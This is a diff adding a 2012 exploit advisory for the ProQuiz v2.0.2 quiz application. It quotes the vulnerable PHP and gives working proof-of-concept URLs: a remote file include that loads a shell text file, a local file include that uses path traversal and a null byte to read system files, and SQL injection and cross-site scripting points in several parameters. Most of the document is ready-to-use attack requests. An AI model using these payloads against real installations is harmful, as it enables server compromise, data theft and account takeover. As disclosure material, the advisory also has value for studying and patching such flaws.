@@ -1,0 +1,105 @@
+####################################################
+### Exploit Title: ProQuiz v2.0.2 - Multiple Vulnerabilities 
+### Date: 18/7/2012 
+### Author: L0n3ly-H34rT 
+### My Site: http://se3c.blogspot.com/
+### Contact: l0n3ly_h34rt@hotmail.com 
+### Vendor Homepage: http://proquiz.softon.org/ 
+### Software Link: http://code.google.com/p/proquiz/downloads/list
+### Tested on: Linux/Windows 
+####################################################
+
+1- Remote File Include :
+
+* In File (my_account.php) in line 114 & 115 :
+
+if($_GET['action']=='getpage' && !empty($_GET['page'])){
+@include_once($_GET['page'].'.php'); 
+
+* P.O.C :
+
+First register and login in your panel and paste that's url e.g. :
+
+http://127.0.0.1/full/my_account.php?action=getpage&page=http://127.0.0.1/shell.txt?
+
+* Note :
+
+Must be allow_url_include=On
+
+-----------------------------------------------------------------------
+
+2- Local File Include :
+
+* In File (my_account.php) in line 114 & 115 :
+
+if($_GET['action']=='getpage' && !empty($_GET['page'])){
+@include_once($_GET['page'].'.php'); 
+
+* P.O.C :
+
+First register and login in your panel and paste that's url e.g. :
+
+http://127.0.0.1/full/my_account.php?action=getpage&page=../../../../../../../../../../windows/win.ini%00.jpg
+
+* Note :
+
+Must be magic_quotes_gpc = Off
+
+---------------------------------------------------------------------
+
+3- Remote SQL Injection & Blind SQL Injection :
+
+* In Two Files :
+
+A- First ( answers.php ) in line 55 :
+
+<?php echo $_GET['instid']; ?>
+
+B- Second ( functions.php ) In :
+
+$_POST['email']
+
+$_POST['username']
+
+* P.O.C :
+
+A- First :
+
+http://127.0.0.1/full/answers.php?action=answers&instid=[SQL]
+
+B- Second :
+
+About Email :
+
+In URL:
+
+http://127.0.0.1/full/functions.php?action=recoverpass
+
+Inject Here In POST Method :
+
+email=[SQL]
+
+About Username :
+
+In URL:
+
+http://127.0.0.1/full/functions.php?action=edit_profile&type=username
+
+Inject Here In POST Method :
+
+username=[SQL]
+
+-------------------------------------------------------------------------------------
+
+4 - Cross Site Scripting :
+
+e.g.: http://127.0.0.1/full/answers.php?action=answers&instid=[XSS]
+
+-----------------------------------------------------------------------------------
+
+# Greetz to my friendz
+
+References:
+
+http://se3c.blogspot.com/
+http://code.google.com/p/proquiz/downloads/list
